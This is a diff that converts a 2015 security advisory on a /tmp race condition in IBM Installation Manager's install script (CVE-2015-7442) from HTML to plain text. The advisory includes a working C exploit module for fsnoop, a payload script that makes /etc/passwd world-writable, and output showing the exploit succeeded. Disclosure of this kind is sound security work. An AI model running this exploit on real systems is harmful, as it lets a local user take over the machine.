@@ -1,63 +1,89 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<title></title>
-<meta name="generator" content="HTML::TextToHTML v2.51"/>
-</head>
-<body>
-<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
-</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
-    white-space: -moz-pre-wrap; /</em> Firefox <em>/
-    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
-    white-space: -o-pre-wrap;   /</em> Opera 7 */
-    word-wrap: break-word;<br/>
-}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 156&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; /tmp race condition in IBM Installation Manager V1.8.1 install script&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2015-10-29&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="http://www-03.ibm.com/software/products/en/appserv-wasfordev">http://www-03.ibm.com/software/products/en/appserv-wasfordev</a>"&gt;<a href="http://www-03.ibm.com/software/products/en/appserv-wasfordev&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">http://www-03.ibm.com/software/products/en/appserv-wasfordev&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;IBM&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2015-11-19&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; <a href="http://www-01.ibm.com/support/docview.wss?uid=swg21971295&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">http://www-01.ibm.com/support/docview.wss?uid=swg21971295&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;IBM Installation Manager is a command line utility to install various software packages developed by IBM.
-</p><p>=====&gt; IBM Installation Manager&gt; Password required
-</p><p>Credentials are required to connect to the IBM download site. Enter IBM ID and password.
-</p><dl>
-  <dt>Select</dt>
-<dd>     P. Provide credentials and connect
-     C. Cancel</dd></dl>
-<p>Select 'P' to enter credentials and connect, or 'C' to cancel.
-</p><p>  Forgot your IBM ID?<br/>
-    <a href="https://www.ibm.com/account/profile?page=forgotuid">https://www.ibm.com/account/profile?page=forgotuid</a>
-  Forgot your password?<br/>
-    <a href="https://www.ibm.com/account/profile?page=forgot">https://www.ibm.com/account/profile?page=forgot</a>
-  IBM ID help and FAQ<br/>
-    <a href="https://www.ibm.com/account/profile/us/en?page=regfaqhelp">https://www.ibm.com/account/profile/us/en?page=regfaqhelp</a>
------&gt; C<br/>
-&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;I noticed a /tmp race condition in IBM&amp;rsquo;s installation manager software install script
-The code in consoleinst.sh is:
-</p>
-<p> 46 TEMP=/tmp<br/>
- 47 tempScript=$TEMP/consoleinst-$$.sh<br/>
- 48 scriptLoc=`dirname &amp;quot;$0&amp;quot;`<br/>
- 49 slash=`expr &amp;quot;$scriptLoc&amp;quot; : &amp;quot;\(/\)&amp;quot;`
- 50 if [ &amp;quot;X$slash&amp;quot; != &amp;quot;X/&amp;quot; ]; then
- 51         scriptLoc=`pwd`/$scriptLoc<br/>
- 52 fi<br/>
- 53 <br/>
- 54 if [ &amp;quot;$0&amp;quot; != &amp;quot;$tempScript&amp;quot; ]; then
-</p><pre>
- 55     cp &amp;quot;$0&amp;quot; &amp;quot;$tempScript&amp;quot;
- 56     cd &amp;quot;$TEMP&amp;quot;
- 57     origScriptLoc=$scriptLoc
- 58     export origScriptLoc
- 59     exec &amp;quot;$tempScript&amp;quot; $@
- 60     # should not return from above exec
- 61     exit 1
-</pre>
-<p> 62 fi
-</p>
-<p>If you guess the pid and create the file before the installer script does you can inject code to be executed at line 59.
-</p><p>This is a log of me controlling permissions of the file during installation of the product:
-</p><p>[M] -rwxrwxrwx 1 larry larry 34  Thu Oct 29 21:46:10 2015 /tmp/consoleinst-9999.sh
-[U] -rwxrwxrwx 1 larry larry 0  Thu Oct 29 21:46:34 2015 /tmp/consoleinst-10382.sh
-[U] -rwxrwxrwx 1 larry larry 2225  Thu Oct 29 21:46:34 2015 /tmp/consoleinst-10382.sh
-</p><p>If I&amp;#039;m able to write to that file directly after it&amp;#039;s modifed (inotify() for the win) I could inject commands into that installation script.&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2015-7442&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=156"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;/<em>&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;fsnoop v3.3 module for exploitation of: &lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;<a href="http://www.vapidlabs.com/advisory.php?v=156&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li">http://www.vapidlabs.com/advisory.php?v=156&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li</a> style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;special thanks to v14dz for getting this working, and Mudge @dotmudge for pointing me&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;at his /tmp race condition tool l0pht-watch.&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;@v14dz&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;<a href="http://vladz.devzero.fr/&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li">http://vladz.devzero.fr/&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li</a> style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;$ make ibm-console.so&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;/tmp/x is :&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;#!/bin/sh&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;chmod 777 /etc/passwd&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;$ ./fsnoop -p ibm-consoleinst.so &lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;[+] ./ibm-consoleinst.so: *</em> IBM Console Install Exploit **&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;[+] ./ibm-consoleinst.so: payload=[0xb77775fb] file=[/tmp/consoleinst-HEREPID.sh]&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;[+] ./ibm-consoleinst.so: waiting for command: &amp;quot;/bin/sh ./consoleinst.sh&amp;quot;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;[+] ./ibm-consoleinst.so: Exploitation done.&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;[+] ./ibm-consoleinst.so: Unloading module.&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;ls -l /etc/passwd&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;-rwxrwxrwx 1 root root 1901 Nov 22  2014 /etc/passwd&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;<em>/&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;#include &amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;#include &amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;char title&lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt; &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;</em>* IBM Console Install Exploit **&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;/* filters <em>/&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;char proc_name&lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt; &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;/bin/sh ./consoleinst.sh&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;char &lt;a href="<a href="http://www.php.net/file">http://www.php.net/file</a>"&gt;&lt;span style="color: #990000;"&gt;file&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt;      &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;/tmp/consoleinst-HEREPID.sh&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;/</em> Evil routines <em>/&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;void payload&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt; &lt;span style="color: #009900;"&gt;&amp;#123;&lt;/span&gt; &lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;  int fd&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;/</em>from v14dz: I use a fifo here, to unlock the paymod execution right after the cp command*/&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;  mkfifo&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;a href="<a href="http://www.php.net/file">http://www.php.net/file</a>"&gt;&lt;span style="color: #990000;"&gt;file&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; &lt;span style="color: #208080;"&gt;0666&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;  fd &lt;span style="color: #339933;"&gt;=&lt;/span&gt; open&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;a href="<a href="http://www.php.net/file">http://www.php.net/file</a>"&gt;&lt;span style="color: #990000;"&gt;file&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; O_RDONLY&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;  &lt;a href="<a href="http://www.php.net/rename">http://www.php.net/rename</a>"&gt;&lt;span style="color: #990000;"&gt;rename&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;a href="<a href="http://www.php.net/file">http://www.php.net/file</a>"&gt;&lt;span style="color: #990000;"&gt;file&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;/tmp/a&amp;quot;&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;  &lt;a href="<a href="http://www.php.net/rename">http://www.php.net/rename</a>"&gt;&lt;span style="color: #990000;"&gt;rename&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;&amp;quot;/tmp/x&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; &lt;a href="<a href="http://www.php.net/file">http://www.php.net/file</a>"&gt;&lt;span style="color: #990000;"&gt;file&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #009900;"&gt;&amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapidlabs.com/advisory.php?v=156">http://www.vapidlabs.com/advisory.php?v=156</a>"&gt;<a href="http://www.vapidlabs.com/advisory.php?v=156&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapidlabs.com/advisory.php?v=156&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
-&lt;/html&gt;
-</p>
-
-</body>
-</html>
+                                Advisory #: 156
+Title: /tmp race condition in IBM Installation Manager V1.8.1 install script
+Author:Larry W. Cashdollar, @_larry0
+Date: 2015-10-29
+Download Site: http://www-03.ibm.com/software/products/en/appserv-wasfordev
+Vendor:IBM
+Vendor Notified: 2015-11-19
+Vendor Contact: http://www-01.ibm.com/support/docview.wss?uid=swg21971295
+Description: IBM Installation Manager is a command line utility to install
+various software packages developed by IBM. =====> IBM Installation Manager>
+Password required Credentials are required to connect to the IBM download site.
+Enter IBM ID and password. Select: P. Provide credentials and connect C. Cancel
+Select 'P' to enter credentials and connect, or 'C' to cancel. Forgot your IBM
+ID? https://www.ibm.com/account/profile?page=forgotuid Forgot your password?
+https://www.ibm.com/account/profile?page=forgot IBM ID help and FAQ https://
+www.ibm.com/account/profile/us/en?page=regfaqhelp -----> C
+Vulnerability:
+I noticed a /tmp race condition in IBM’s installation manager software install
+script The code in consoleinst.sh is: 46 TEMP=/tmp 47 tempScript=$TEMP/
+consoleinst-$$.sh 48 scriptLoc=`dirname "$0"` 49 slash=`expr "$scriptLoc" : "\(/
+\)"` 50 if [ "X$slash" != "X/" ]; then 51 scriptLoc=`pwd`/$scriptLoc 52 fi 53 54
+if [ "$0" != "$tempScript" ]; then 55 cp "$0" "$tempScript" 56 cd "$TEMP" 57
+origScriptLoc=$scriptLoc 58 export origScriptLoc 59 exec "$tempScript" $@ 60 #
+should not return from above exec 61 exit 1 62 fi If you guess the pid and
+create the file before the installer script does you can inject code to be
+executed at line 59. This is a log of me controlling permissions of the file
+during installation of the product: [M] -rwxrwxrwx 1 larry larry 34 Thu Oct 29
+21:46:10 2015 /tmp/consoleinst-9999.sh [U] -rwxrwxrwx 1 larry larry 0 Thu Oct 29
+21:46:34 2015 /tmp/consoleinst-10382.sh [U] -rwxrwxrwx 1 larry larry 2225 Thu
+Oct 29 21:46:34 2015 /tmp/consoleinst-10382.sh If I'm able to write to that file
+directly after it's modifed (inotify() for the win) I could inject commands into
+that installation script.
+CVE-2015-7442
+JSON:Export
+Exploit Code:
+   1. /*
+   2. fsnoop v3.3 module for exploitation of:
+   3. http://www.vapidlabs.com/advisory.php?v=156
+   4. special thanks to v14dz for getting this working, and Mudge @dotmudge for
+      pointing me
+   5. at his /tmp race condition tool l0pht-watch.
+   6.  
+   7. @v14dz
+   8. http://vladz.devzero.fr/
+   9.  
+  10. $ make ibm-console.so
+  11.  
+  12. /tmp/x is :
+  13.  
+  14. #!/bin/sh
+  15. chmod 777 /etc/passwd
+  16.  
+  17. $ ./fsnoop -p ibm-consoleinst.so
+  18. [+] ./ibm-consoleinst.so: ** IBM Console Install Exploit **
+  19. [+] ./ibm-consoleinst.so: payload=[0xb77775fb] file=[/tmp/consoleinst-
+      HEREPID.sh]
+  20. [+] ./ibm-consoleinst.so: waiting for command: "/bin/sh ./consoleinst.sh"
+  21. [+] ./ibm-consoleinst.so: Exploitation done.
+  22. [+] ./ibm-consoleinst.so: Unloading module.
+  23.  
+  24. ls -l /etc/passwd
+  25. -rwxrwxrwx 1 root root 1901 Nov 22  2014 /etc/passwd
+  26.  
+  27. */
+  28.  
+  29.  
+  30.  
+  31. #include <sys/types.h>
+  32. #include <sys/stat.h>
+  33. #include <fcntl.h>
+  34.  
+  35. char title[] = "** IBM Console Install Exploit **";
+  36.  
+  37. /* filters */
+  38. char proc_name[] = "/bin/sh ./consoleinst.sh";
+  39. char file[]      = "/tmp/consoleinst-HEREPID.sh";
+  40.  
+  41. /* Evil routines */
+  42. void payload() {
+  43.   int fd;
+  44. /*from v14dz: I use a fifo here, to unlock the paymod execution right
+      after the cp command*/
+  45.   mkfifo(file, 0666);
+  46.   fd = open(file, O_RDONLY);
+  47.   rename(file, "/tmp/a");
+  48.   rename("/tmp/x", file);
+  49. }
+Screen Shots:
+Advisory: http://www.vapidlabs.com/advisory.php?v=156
